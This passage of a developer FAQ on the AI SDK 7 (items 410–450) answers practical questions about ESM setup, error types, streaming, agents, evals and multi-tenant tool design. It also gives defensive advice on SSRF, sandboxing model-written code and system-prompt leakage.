It supports Zod 3 (from 3.25.76) and Zod 4 (from 4.1.8) as a peer dependency. Zod 4 is faster and gives better JSON Schema output, so new projects usually use it. You can import from `zod` or `zod/v4` depending on your Zod version.

## 410: What does "ESM only" mean for an existing CommonJS project?

AI SDK 7 packages can't be loaded with `require()`. Your project needs `"type": "module"` or `.mjs` files, or a bundler (Next.js, Vite, esbuild) that handles ESM. Test tools need ESM support too, for example Vitest, or Jest with ESM config. In plain Node.js CommonJS, a dynamic `import('ai')` still works, but it is clumsy.

## 411: Why should you never import a provider instance into client code?

A provider instance with an API key from `process.env` or a hard-coded key would put that key in the browser bundle if the code runs on the client. Even without a key, client-side model calls bypass your auth and limits.

Keep provider imports in server-only modules (in Next.js you can add `import 'server-only'`), and only import types or `@ai-sdk/react` in client components.

## 412: Why does the server hide error messages by default?

Errors can contain API keys in URLs, internal hostnames, provider responses or stack traces. Sending them to the browser leaks information. So `toUIMessageStream` sends a generic message unless you provide an `onError` that returns safe text.

Log the full error on the server, and map known errors to friendly messages for the user.

## 413: What is UIMessageStreamError?

It's thrown when a UI message stream has an invalid sequence of chunks, for example a `text-delta` for an id that never had `text-start`, or a tool output for an unknown tool call. You usually see it when you write custom chunks with `writer.write` or merge streams in the wrong order.

Follow the start, delta, end pattern and keep ids consistent.

## 414: What are MissingToolResultsError and MessageConversionError?

`MissingToolResultsError` means the message history has a tool call without a matching tool result, so it can't be sent to the model. `MessageConversionError` means a message could not be converted, for example a part type the conversion doesn't know.

Both often come from saved histories that were cut off mid-tool-call or from old message formats. Clean the history, or use `ignoreIncompleteToolCalls`.

## 415: What is ToolChoiceViolationError?

It's thrown when the model doesn't follow `toolChoice`, for example you required a specific tool but the model called another one or answered with text. Some models don't strictly follow forced tool choice. Retry, simplify the request, or pick a model that supports forced tool calls.

## 416: Why can file URLs in prompts be a security risk?

If users can put URLs in prompts and the SDK downloads them (when the provider can't fetch them itself), your server makes requests to those URLs. An attacker could point to internal addresses, which is server-side request forgery (SSRF).

Use `experimental_download` to control downloads (block private IP ranges, allow only certain hosts) or upload files yourself and pass bytes.

## 417: How do you process 100,000 documents with a model?

Don't run them one by one in a request. Options:

- A job queue with limited concurrency, calling `generateText` with `Output.object`, and saving results with retries.
- A provider batch API through the experimental batch functions, which is cheaper but slower.
- A cheaper model for bulk work and a stronger one for low-confidence items.

Track progress per document so a crash doesn't restart everything, and run a small sample first to check quality and cost.

## 418: When should you classify with embeddings instead of a model call?

For a fixed set of labels and high volume, embeddings can be much cheaper and faster: embed examples for each label, embed the new text, and pick the nearest label with `cosineSimilarity`. A model call handles subtle cases and new labels better and can explain its choice.

A common mix is embeddings first, and a model call only when the top scores are close.

## 419: Can you make model outputs fully deterministic?

Not reliably. `temperature: 0` and `seed` (where supported) make outputs much more repeatable, but providers don't guarantee identical results, because of batching, hardware and model updates. Design tests and features so that small differences in wording are fine, and use structured output where you need exact values.

## 420: Why are snapshot tests of model output a bad idea?

Outputs change with model updates, provider changes and tiny prompt edits, so snapshots break all the time and people start updating them blindly. Test your code with mocks and fixed responses, and test quality with evals that check properties (valid schema, contains the right facts, no banned content) rather than exact text.

## 421: How do you build a voice assistant with the AI SDK?

Two main designs:

- Pipeline: `transcribe` the audio, run `streamText` or an agent on the text, then `generateSpeech` (or experimental speech streaming) on the answer. It's simple and works with any text model, but adds latency at each step.
- Realtime: experimental realtime support (for example `experimental_useRealtime` in React with a realtime model through the gateway) streams audio both ways with one model, which feels much faster but is newer and more limited.

Pick the pipeline for flexibility and tools, and realtime for natural conversation.

## 422: How do you return generated images from a tool efficiently?

Don't return base64 image data as the tool result, because it would be sent back to the model as text and cost a huge number of tokens. Upload the image to storage and return a URL plus a short description. If the model needs to see the image, use `toModelOutput` to send it as a file part instead of text.

## 423: What are citations on text parts?

Some providers (OpenAI Responses and Anthropic) attach a `citations` array to text parts. Each citation has a `source`, optional `startIndex` and `endIndex` offsets in the text, and optional `citedText` from the source. They let you show inline references for specific sentences, while `sources` lists everything that was retrieved.

Providers use different offset conventions, and JavaScript strings use UTF-16, so be careful when slicing text that contains emoji.

## 424: When should you use message metadata and when data parts?

Use metadata for facts about the whole message: created time, model, token usage, feedback score. It isn't sent to the model. Use data parts for content inside the message flow: progress updates, cards, charts, intermediate results. They appear in order with the other parts and can be converted for the model with `convertDataPart` if needed.

## 425: Why do server-generated message IDs matter?

If the client and server generate different IDs for the same assistant message, saving and loading can create duplicates, and resume or editing can target the wrong message. Generating IDs on the server with `generateMessageId` and sending them in the stream keeps one ID everywhere.

## 426: How do you scale a chat backend horizontally?

Keep API routes stateless: load history from the database, save in `onEnd`, and keep resumable streams in Redis so any instance can serve a reconnect. Rate limits and budgets also need shared storage. Long agent runs should move to workers or durable workflows instead of living in a web instance's memory.

## 427: What does creating an MCP client per request cost, and how do you reduce it?

Each client does a connection and handshake, and `tools()` lists tools, which adds latency to every request. You can cache the tool list for a short time, keep a connection pool in long-running servers, or call MCP tools only when needed. In serverless, per-request clients are often still the safest choice, so measure the cost before optimizing.

## 428: How do you decide between the AI SDK and a provider's own agent SDK?

Provider agent SDKs (for example the OpenAI Agents SDK or the Claude Agent SDK) are tuned for their models and features and may get new features first. The AI SDK works across providers, has strong UI integration, and lets you switch models easily. If you're committed to one provider and need its newest agent features, its SDK can be a good fit. If you need provider choice, web UI streaming and TypeScript-first types, the AI SDK fits better. Harnesses let you run some provider agents inside the AI SDK too.

## 429: What does the experimental_ prefix mean in the AI SDK?

APIs with `experimental_` (or `Experimental_` for types) may change or be removed in any release, including patch releases. Stable APIs follow semantic versioning. When a feature becomes stable, the prefix is dropped, and the old name usually stays as a deprecated alias for a while, as with `generateImage`, `transcribe` and `prepareStep` in AI SDK 7.

Pin exact versions if you rely on experimental features, and read the changelog before upgrading.

## 430: How do you upgrade AI SDK versions safely in a team?

Pin `ai` and all `@ai-sdk/*` packages together, upgrade them in one change, run the codemod for major versions, fix deprecation warnings early (they become breaking in the next major), and run your evals and integration tests. Watch logs for new warnings after deploy. Reading the migration guide matters most for changed defaults, like AI SDK 7 rejecting system messages in `messages` or telemetry behavior.

## 431: Answers are often cut off in the middle. What do you check?

Look at `finishReason`. If it's `length`, the model hit `maxOutputTokens`. With reasoning models, reasoning tokens count toward the output limit too, so a high `reasoning` level can use most of the budget before the answer starts. Raise `maxOutputTokens`, lower the reasoning level, or ask for shorter answers.

If `finishReason` is `stop` but the text looks cut, check your UI: a proxy, an early return or a client abort may have stopped the stream.

## 432: An agent is slow. How do you find out why?

Turn on telemetry or DevTools and look at the span tree for one slow run. Check the number of steps, time per model call (first chunk and total), time per tool, and token counts per step. Common causes are too many steps, growing context, slow tools called one after another, and high reasoning levels.

Fixes follow from the data: fewer steps (better tools or code mode), parallel tool calls, caching, smaller models for simple steps, and lower reasoning.

## 433: After switching from OpenAI to Anthropic, tool calls broke. What do you check?

- Schema features the new provider doesn't support (check warnings).
- Tool names and descriptions that worked by luck with the old model.
- `toolChoice` and parallel tool call behavior differences.
- Provider options that only applied to OpenAI, like `strict` or reasoning settings.
- Message history containing provider-specific parts, like OpenAI reasoning items, that the new provider can't use.
- Instructions tuned for one model's habits.

Run your evals against both and adjust prompts and tool descriptions.

## 434: How do you keep a history that works across providers?

Store `UIMessage`s, which are provider-neutral. When switching providers mid-conversation, provider-specific data like reasoning signatures or provider-executed tool results may not carry over, so prune reasoning and provider-specific parts from older turns before sending them to a different provider.

## 435: What happens to provider-executed tool results in later turns?

Tools run by the provider (like web search) have results that the provider may expect back in a specific format in the next turn. The SDK keeps them in the messages with provider metadata so the same provider can use them. A different provider may not understand them, which is one more reason to prune them when switching models.

## 436: How would you implement chat feedback (thumbs up/down) linked to traces?

Store a trace or request ID in the assistant message metadata (from `messageMetadata` on the server). When the user clicks thumbs up or down, send the message ID and feedback to your API, and attach the score to the trace in your observability tool. This connects bad answers to the exact prompt, model and tool calls that produced them, which is the base for improving prompts and building eval sets.

## 437: What are the risks of letting the model write and run code?

Generated code can delete files, read secrets, use the network, or run forever. Only run it in an isolated sandbox with no secrets, limited network, time and memory limits, and a fresh environment per run. Code mode uses a QuickJS sandbox, and harnesses and sandbox sessions run in isolated environments. Never run model-written code with `eval` or a shell on your main server.

## 438: How do you make tools safe to expose to many tenants?

Every tool should check permissions itself, using the tenant and user from `toolsContext`, not from model input. Scope database queries by tenant ID, rate limit expensive tools, log every tool execution with the tenant, and keep secrets out of tool results. Test with prompts that try to access another tenant's data.

## 439: How do you avoid leaking the system prompt?

Assume that a determined user can get the model to reveal its instructions. So don't put secrets, keys or private business rules in the prompt. Keep sensitive logic in code and tools. You can add instructions not to reveal the prompt and filter outputs for exact copies of it, but treat that as a speed bump, not protection.

## 440: How do you design evals for an agent, not just single answers?

Score the whole run: did it reach the right final state, which tools it called and with what inputs, how many steps and tokens it used, and whether it stayed within rules (for example never calling a refund tool without approval). Use mocked or sandboxed tools so runs are safe and repeatable, collect `steps` from each run, and check them with code and, for open-ended parts, with a judge model.

## 441: How do you handle a stream that errors after partial output in the UI?

The user already sees part of the answer, then `status` becomes `error`. Keep the partial text but mark it clearly as incomplete, and offer `regenerate()`. On the server, `onEnd` still runs with an outcome you can check, so you can save the partial message with a flag. With `streamRetries`, many transient errors are retried before the user sees them.

## 442: Why might onEnd on the server not run for some requests?

`onEnd` runs when the stream has been fully processed. If the client disconnects and the stream is not consumed, or the function is killed by a timeout, it may never run. Use `consumeStream()` to process the stream regardless of the client, set the right function duration, and for critical saves, also save progress in `onStepEnd`.

## 443: How would you add tracing context such as a user ID to all spans?

Pass it in `runtimeContext` and use the telemetry option `includeRuntimeContext` to choose which fields go on spans. That way every span of the call (model calls, tool calls) has the user or tenant ID, and you can filter traces by it.

```ts
await generateText({
  model,
  prompt,
  runtimeContext: { userId, tenantId, secretToken },
  telemetry: {
    functionId: "chat",
    includeRuntimeContext: { userId: true, tenantId: true },
  },
});
```

Pick fields carefully so secrets in the context never reach your tracing system.

## 444: How do you make an agent ask the user a clarifying question?

Give it a tool without `execute`, like `askUser` with a `question` field. When the model calls it, the loop stops and the UI shows the question with an input. The user's answer is sent back with `addToolOutput`, and `sendAutomaticallyWhen` continues the run. This is cleaner than having the model end its turn with a question in plain text, because your UI knows a reply is expected.

## 445: What is the difference between steering and sending a new message?

A new message with `sendMessage` starts a new request after the current one finishes or is stopped. Steering injects a message into a run that is still going, before its next step, so the agent can change direction without losing its progress or repeating finished tool calls. Steering needs the server to keep the run's steering object, so it fits long-running agents more than short chat answers.

## 446: How do you share prompts and tools across many routes without copy-paste?

Put agents, tools and instruction builders in their own modules, define model aliases in one provider, and use `ToolLoopAgent` instances or helper functions in routes. Middleware handles cross-cutting concerns (logging, guardrails, caching) once. Routes then only handle HTTP details: auth, parsing, and returning the stream.

## 447: What is the reset-step stream part used for?

When `streamRetries` retries a broken step, the SDK sends a `reset-step` part so consumers know the previous partial output of that step is being replaced. A custom UI or consumer that builds text from deltas should drop that step's partial content when it sees it, or the user will see duplicated text.

## 448: How do you choose between ToolLoopAgent, WorkflowAgent and HarnessAgent?

- `ToolLoopAgent`: in-memory loop, full control, best for chat requests and short tasks.
- `WorkflowAgent`: same loop but durable, for long runs, waiting on humans, and crash recovery.
- `HarnessAgent`: wraps an existing agent runtime like Claude Code or Codex, for coding and workspace tasks in a sandbox where you want that runtime's built-in tools and behavior.

All three implement the `Agent` interface, so the UI and routes can stay the same when you switch.

## 449: What are the main things AI SDK 7 changed compared to AI SDK 6?

- Renames: `instructions` (was `system`), `onEnd` and `onStepEnd` (were `onFinish` and `onStepFinish`), `stream` (was `fullStream`), `telemetry` (was `experimental_telemetry`), `isStepCount` (alias `stepCountIs`).
- Stable APIs: `generateImage`, `transcribe`, `generateSpeech`, `customProvider`, `output`, `prepareStep`, `activeTools`.
- New: call-level `toolApproval`, `runtimeContext` and `toolsContext`, structured `timeout`, stream retries, tool search, `finalStep`, standalone stream response helpers, harnesses and `WorkflowAgent`.
- Changed defaults: system messages rejected in `messages`, `usage` is the total over all steps, request and response bodies not kept by default.
- Requirements: Node.js 22+ and ESM only.

## 450: If you were starting a new AI feature today with the AI SDK, how would you set it up?

Start simple: a Next.js (or similar) route with `streamText` and `useChat`, a model through the gateway or a provider, typed tools with `tool()`, and `UIMessage` persistence with server-side IDs. Add `ToolLoopAgent` when the same agent is used in several places. From day one, add telemetry with `functionId`, rate limits, step and token limits, safe error messages, and a small eval set. Then improve based on data: caching, model routing, tool approval for risky actions, and durable workflows only when runs become long.
